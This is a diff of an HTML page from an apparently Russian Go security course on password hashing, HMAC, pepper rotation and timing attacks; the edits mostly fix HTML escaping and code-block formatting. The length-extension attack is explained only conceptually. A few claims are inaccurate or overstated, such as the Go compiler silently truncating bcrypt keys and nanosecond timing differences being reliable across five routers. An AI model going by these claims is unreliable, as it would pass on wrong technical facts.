 <p style="margin-bottom: 6px;">Хотя время вычисления самого bcrypt огромно (~100 мс) по сравнению с микросекундным сравнением, отсутствие constant-time позволило бы локальному атакующему на том же физическом хосте (через сожительство виртуальных машин в облаке) анализировать прерывания кэша и восстанавливать биты хэша из памяти.</p></div>
   </div>
   <div class="callout callout-pitfalls">
@@ -5611,7 +5587,7 @@ func main() {
 <li style="margin-bottom: 4px;">При полном совпадении процессор проходит все 32 байта.</li>
 </ul>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">Хотя в наносекундном масштабе разница мала, современные алгоритмы сетевого статистического фильтра (Box-Cox transformation, Welch's t-test) позволяют атакующему надежно различать задержки в 10–20 наносекунд даже через 5 сетевых маршрутизаторов.</p></div>
+<p style="margin-bottom: 6px;">Хотя в наносекундном масштабе разница мала, современные алгоритмы сетевого статистического фильтра (Box-Cox transformation, Welch&#x27;s t-test) позволяют атакующему надежно различать задержки в 10–20 наносекунд даже через 5 сетевых маршрутизаторов.</p></div>
   </div>
   <div style="margin: 18px 0 10px;">
     <h4 style="color: #38bdf8; font-size: 1.05rem; margin-bottom: 8px; display: flex; align-items: center; gap: 6px;">
@@ -5716,7 +5692,7 @@ func main() {
     <div class="callout-title">⚙️ Под капотом Go (Compiler, Linker & Runtime)</div>
     <div><p style="margin-bottom: 6px;">Почему тайминг-атаки работают на современных процессорах с Out-of-Order исполнением:</p>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Процессор использует блок предсказания ветвлений (Branch Predictor).</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> При выполнении обычного цикла сравнения <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">for i := 0; i < len; i++ { if a[i] != b[i] { return false } }</code> процессор спекулятивно предполагает, что условие выхода не сработает.</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> При выполнении обычного цикла сравнения <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">for i := 0; i &lt; len; i++ { if a[i] != b[i] { return false } }</code> процессор спекулятивно предполагает, что условие выхода не сработает.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Когда происходит несовпадение, процессор сбрасывает конвейер инструкций (Pipeline Flush / Branch Misprediction Penalty), что занимает от 15 до 20 тактов.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">4.</span> В <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">subtle.ConstantTimeCompare</code> ветвления отсутствуют вовсе — команды выполняются строго линейно через инструкции <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">OR</code> и <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">XOR</code>, не вызывая сбросов конвейера и флуктуаций времени.</div></div>
   </div>
@@ -6057,13 +6033,13 @@ func main() {
   </div>
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
-    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Хранение перца в репозитории Git:</strong> Хранение перца в константах Go (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">const Pepper = "..."</code>) обесценивает всю защиту: при утечке исходного кода или доступе к Git репозиторию хакер получает ключ. Перец должен внедряться во время запуска контейнера через Vault Agent / Kubernetes Secret.</div>
+    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Хранение перца в репозитории Git:</strong> Хранение перца в константах Go (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">const Pepper = &quot;...&quot;</code>) обесценивает всю защиту: при утечке исходного кода или доступе к Git репозиторию хакер получает ключ. Перец должен внедряться во время запуска контейнера через Vault Agent / Kubernetes Secret.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Отсутствие плана ротации перца:</strong> Для плановой смены перца необходимо поддерживать список версий ключей (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">Pepper_v1</code>, <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">Pepper_v2</code>) с указанием версии в префиксе хэша.</div></div>
   </div>
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
     <div><p style="margin-bottom: 6px;"><strong>Вопрос с собеседования:</strong> Как организовать ротацию ключа Pepper (перец приложения) без сброса паролей пользователей?</p>
-<p style="margin-bottom: 6px;"><strong>Ответ:</strong> 1) Каждому перцу присваивается идентификатор версии: <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">key_id</code> (например, 1, 2). 2) В формате хранения хэша добавляется префикс версии перца: например, <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">$p=2$argon2id$...</code>. 3) Сервис поддерживает массив активных ключей: текущий для новых записей (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">CurrentKeyID = 2</code>) и старые для чтения (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">Keys = map[int][]byte{1: key1, 2: key2}</code>). 4) При логине сервис проверяет хэш с перцем соответствующей версии. Если <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">key_id < CurrentKeyID</code>, пароль тут же перехэшируется с актуальным перцем и сохраняется в БД (Transparent Upgrade).</p></div>
+<p style="margin-bottom: 6px;"><strong>Ответ:</strong> 1) Каждому перцу присваивается идентификатор версии: <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">key_id</code> (например, 1, 2). 2) В формате хранения хэша добавляется префикс версии перца: например, <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">$p=2$argon2id$...</code>. 3) Сервис поддерживает массив активных ключей: текущий для новых записей (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">CurrentKeyID = 2</code>) и старые для чтения (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">Keys = map[int][]byte{1: key1, 2: key2}</code>). 4) При логине сервис проверяет хэш с перцем соответствующей версии. Если <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">key_id &lt; CurrentKeyID</code>, пароль тут же перехэшируется с актуальным перцем и сохраняется в БД (Transparent Upgrade).</p></div>
   </div>
 </div>
 <div class="exercise-card" id="ex-34">
@@ -6199,7 +6175,7 @@ func main() {
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
     <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Недооценка возможностей облачных вычислений:</strong> Атакующему не обязательно покупать видеокарты — аренда спотовых инстансов AWS EC2 (G5/P4) с сотнями GPU обходится в несколько долларов в час.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Использование простых паролей:</strong> Даже медленный Argon2id уязвим, если пользователь поставил пароль <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"123456"</code>. Хэширование должно обязательно дополняться политикой проверки сложности паролей.</div></div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Использование простых паролей:</strong> Даже медленный Argon2id уязвим, если пользователь поставил пароль <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;123456&quot;</code>. Хэширование должно обязательно дополняться политикой проверки сложности паролей.</div></div>
   </div>
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
@@ -6357,7 +6333,7 @@ func main() {
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
     <div><p style="margin-bottom: 6px;"><strong>Вопрос с собеседования:</strong> Почему при запуске бенчмарков bcrypt на локальной машине разработчика и в облачном контейнере Kubernetes результаты времени могут различаться в 3–5 раз?</p>
-<p style="margin-bottom: 6px;"><strong>Ответ:</strong> 1) <strong>vCPU Throttling и CFS Quota:</strong> В Kubernetes лимит CPU задается через Linux Completely Fair Scheduler (CFS). Если контейнеру выделен лимит <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">cpu: "500m"</code> (половина ядра), ядро Linux будет принудительно останавливать выполнение процесса на миллисекунды (CPU Throttling), увеличивая общее время bcrypt в разы. 2) <strong>Архитектура процессора:</strong> На ноутбуках часто стоят ядра с высокой частотой (до 4.5–5.0 ГГц), тогда как в облачных серверах частота vCPU обычно зафиксирована на уровне 2.4–2.8 ГГц. Калибровку параметров безопасности всегда нужно проводить в реальной среде выполнения Kubernetes.</p></div>
+<p style="margin-bottom: 6px;"><strong>Ответ:</strong> 1) <strong>vCPU Throttling и CFS Quota:</strong> В Kubernetes лимит CPU задается через Linux Completely Fair Scheduler (CFS). Если контейнеру выделен лимит <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">cpu: &quot;500m&quot;</code> (половина ядра), ядро Linux будет принудительно останавливать выполнение процесса на миллисекунды (CPU Throttling), увеличивая общее время bcrypt в разы. 2) <strong>Архитектура процессора:</strong> На ноутбуках часто стоят ядра с высокой частотой (до 4.5–5.0 ГГц), тогда как в облачных серверах частота vCPU обычно зафиксирована на уровне 2.4–2.8 ГГц. Калибровку параметров безопасности всегда нужно проводить в реальной среде выполнения Kubernetes.</p></div>
   </div>
 </div>
 <div class="exercise-card" id="ex-36">
@@ -6381,7 +6357,7 @@ func main() {
 <li style="margin-bottom: 4px;"><strong>Атака на расширение длины (Length Extension Attack):</strong></li>
 </ul>
 <p style="margin-bottom: 6px;">Злоумышленник перехватывает <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">payload</code> и подпись <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">hash = SHA256(secret + payload)</code>.</p>
-<p style="margin-bottom: 6px;">Не зная секрета <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">secret</code>, атакующий инициализирует хэшер значением <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">hash</code>, дописывает вредоносные данные <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&admin=true</code> и получает <strong>абсолютно валидный хэш</strong> для сообщения <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">payload + padding + &admin=true</code>!</p>
+<p style="margin-bottom: 6px;">Не зная секрета <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">secret</code>, атакующий инициализирует хэшер значением <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">hash</code>, дописывает вредоносные данные <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&amp;admin=true</code> и получает <strong>абсолютно валидный хэш</strong> для сообщения <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">payload + padding + &amp;admin=true</code>!</p>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;"><strong>Стандарт HMAC (RFC 2104):</strong></p>
 <p style="margin-bottom: 6px;">Вложенная конструкция:</p>
@@ -6495,9 +6471,9 @@ func main() {
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
     <div><p style="margin-bottom: 6px;"><strong>Вопрос с собеседования:</strong> Как устроен механизм защиты от Replay-атак в вебхуках Stripe и GitHub?</p>
 <p style="margin-bottom: 6px;"><strong>Ответ:</strong> В заголовок запроса передается временная метка и подпись: <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">Stripe-Signature: t=1614000000,v1=5257a...</code>.</p>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Подпись вычисляется поверх строки: <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">t + "." + request_body</code>.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Сервер-получатель сначала парсит <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">t</code> и проверяет, что <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">time.Now() - t <= 5 * time.Minute</code> (защита от устаревших повторных пакетов).</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Затем сервер вычисляет HMAC от <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">t + "." + rawBody</code> и сверяет с <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">v1</code> через <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">subtle.ConstantTimeCompare</code>. Это одновременно защищает от изменения данных, от подделки времени и от повторной отправки старых вебхуков.</div></div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Подпись вычисляется поверх строки: <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">t + &quot;.&quot; + request_body</code>.</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Сервер-получатель сначала парсит <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">t</code> и проверяет, что <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">time.Now() - t &lt;= 5 * time.Minute</code> (защита от устаревших повторных пакетов).</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Затем сервер вычисляет HMAC от <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">t + &quot;.&quot; + rawBody</code> и сверяет с <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">v1</code> через <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">subtle.ConstantTimeCompare</code>. Это одновременно защищает от изменения данных, от подделки времени и от повторной отправки старых вебхуков.</div></div>
   </div>
 </div>
 <div class="exercise-card" id="ex-37">
@@ -6714,7 +6690,7 @@ func main() {
     <h4 style="color: #38bdf8; font-size: 1.05rem; margin-bottom: 8px; display: flex; align-items: center; gap: 6px;">
       <span>🔍</span> Пошаговый ход решения и ход мысли инженера
     </h4>
-    <div style="color: #cbd5e1; font-size: 0.94rem;"><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Создайте пароль <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"HighLoadDistributedSystem2026!"</code>.</div>
+    <div style="color: #cbd5e1; font-size: 0.94rem;"><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Создайте пароль <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;HighLoadDistributedSystem2026!&quot;</code>.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Дважды вызовите <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bcrypt.GenerateFromPassword</code> с <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">cost = 12</code>.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Убедитесь и докажите, что полученные срезы <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">hash1</code> и <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">hash2</code> побайтово не равны (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bytes.Equal == false</code>).</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">4.</span> Вызовите <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bcrypt.CompareHashAndPassword(hash1, password)</code> — подтвердите успех.</div>
@@ -6799,7 +6775,7 @@ func main() {
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Быстрый хэш (SHA-256 без соли):</strong></div>
 <p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">ClientHash == DBHash</code> (Прямое сравнение строк). Небезопасно, уязвимо к радужным таблицам.</p>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>KDF с солью (bcrypt, Argon2id):</strong></div>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">Verify(storedHash, inputPassword) -> extract_salt -> recompute_with_old_salt -> constant_time_compare</code>.</p>
+<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">Verify(storedHash, inputPassword) -&gt; extract_salt -&gt; recompute_with_old_salt -&gt; constant_time_compare</code>.</p>
 <p style="margin-bottom: 6px;">Разработчик никогда не должен использовать оператор <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">==</code> для проверки хэшей паролей. Функция <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">CompareHashAndPassword</code> берет на себя извлечение соли и деривацию.</p></div>
   </div>
   <div class="callout callout-pitfalls">
@@ -6810,7 +6786,7 @@ func main() {
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
     <div><p style="margin-bottom: 6px;"><strong>Вопрос с собеседования:</strong> Почему в unit-тестах бизнес-логики сервиса пользователей никогда не тестируют точное равенство bcrypt-хэша эталонной константе (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">assert.Equal(t, expectedHash, actualHash)</code>)?</p>
-<p style="margin-bottom: 6px;"><strong>Ответ:</strong> Из-за встроенной в bcrypt генерации криптографической случайной соли: каждый вызов <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bcrypt.GenerateFromPassword</code> производит уникальную строку хэша. Любой unit-тест, проверяющий прямое равенство <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">actualHash == "$2a$10$..."</code>, упадет при первом же запуске. В тестах корректность создания хэша проверяется исключительно вызовом <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">err := bcrypt.CompareHashAndPassword([]byte(actualHash), []byte(rawPassword))</code> с проверкой <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">assert.NoError(t, err)</code>.</p></div>
+<p style="margin-bottom: 6px;"><strong>Ответ:</strong> Из-за встроенной в bcrypt генерации криптографической случайной соли: каждый вызов <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bcrypt.GenerateFromPassword</code> производит уникальную строку хэша. Любой unit-тест, проверяющий прямое равенство <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">actualHash == &quot;$2a$10$...&quot;</code>, упадет при первом же запуске. В тестах корректность создания хэша проверяется исключительно вызовом <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">err := bcrypt.CompareHashAndPassword([]byte(actualHash), []byte(rawPassword))</code> с проверкой <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">assert.NoError(t, err)</code>.</p></div>
   </div>
 </div>
 <div class="exercise-card" id="ex-39">
@@ -6940,11 +6916,9 @@ func main() {
   <div class="callout callout-hood">
     <div class="callout-title">⚙️ Под капотом Go (Compiler, Linker & Runtime)</div>
     <div><p style="margin-bottom: 6px;">Внутри пакета <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">golang.org/x/crypto/bcrypt</code> исходная функция <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bcrypt</code> инициализирует внутренний массив <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">key [72]byte</code>. Алгоритм <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">ExpandKey</code> циклически считывает ровно до 72 байт пользовательского ключа для инициализации P-массива и S-боксов Blowfish:</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`go</p>
-<p style="margin-bottom: 6px;">for i := 0; i < len(key) && i < 72; i++ { ... }</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
-<p style="margin-bottom: 6px;">Если <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">len(key) > 72</code>, компилятор даже не выбрасывает ошибку, а молча обрезает срез до <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">key[:72]</code>.</p>
-<p style="margin-bottom: 6px;">Если в системе используется pre-hashing через <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">sha256.Sum256</code>, 32-байтный результат Base64-кодируется в 44 байта ASCII. Поскольку 44 < 72, никакой обрезки не происходит, а энтропия длинных паролей (passphrases) сохраняется полностью.</p></div>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-go"><code class="language-go">for i := 0; i &lt; len(key) &amp;&amp; i &lt; 72; i++ { ... }</code></pre></div>
+<p style="margin-bottom: 6px;">Если <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">len(key) &gt; 72</code>, компилятор даже не выбрасывает ошибку, а молча обрезает срез до <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">key[:72]</code>.</p>
+<p style="margin-bottom: 6px;">Если в системе используется pre-hashing через <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">sha256.Sum256</code>, 32-байтный результат Base64-кодируется в 44 байта ASCII. Поскольку 44 &lt; 72, никакой обрезки не происходит, а энтропия длинных паролей (passphrases) сохраняется полностью.</p></div>
   </div>
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
@@ -6978,9 +6952,7 @@ func main() {
 </ul>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;">Функция вызова в Go:</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`go</p>
-<p style="margin-bottom: 6px;">argon2.IDKey(password, salt []byte, time uint32, memory uint32, threads uint8, keyLen uint32) []byte</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-go"><code class="language-go">argon2.IDKey(password, salt []byte, time uint32, memory uint32, threads uint8, keyLen uint32) []byte</code></pre></div>
 <p style="margin-bottom: 6px;">Параметры:</p>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">time</code> (итерации): количество проходов по памяти (OWASP рекомендует от 1 до 3).</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">memory</code>: объем памяти в Килобайтах (64 МБ = <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">64 * 1024 = 65536</code> КиБ).</div>
@@ -7132,7 +7104,7 @@ func main() {
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> <strong>$p$ (parallelization parameter):</strong> степень параллелизма (количество независимых экземпляров вычислений, обычно 1).</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">4.</span> <strong>$keyLen$:</strong> требуемая длина итогового псевдослучайного ключа (обычно 32 байта).</div>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Требования к оперативной памяти:</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Требования к оперативной памяти:</h5>
 <p style="margin-bottom: 6px;">Формула потребления памяти scrypt:</p>
 <p style="margin-bottom: 6px;">$$\text{RAM} = 128 \times N \times r \text{ байт}$$</p>
 <p style="margin-bottom: 6px;">При параметрах $N=32768$ ($2^{15}$) и $r=8$:</p>
@@ -7262,7 +7234,7 @@ func main() {
   </div>
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
-    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Параметр $N$ обязан быть степенью двойки:</strong> Если передать произвольное число (например, $N=30000$), <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">scrypt.Key</code> мгновенно вернет ошибку <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">scrypt: N must be > 1 and a power of 2</code>.</div>
+    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Параметр $N$ обязан быть степенью двойки:</strong> Если передать произвольное число (например, $N=30000$), <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">scrypt.Key</code> мгновенно вернет ошибку <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">scrypt: N must be &gt; 1 and a power of 2</code>.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Целочисленное переполнение (Integer Overflow):</strong> Если параметры $N$ и $r$ заданы слишком большими (например, $N=1048576, r=16$), размер буфера превысит допустимые лимиты среза в Go, что вызовет панику или ошибку аллокации.</div>
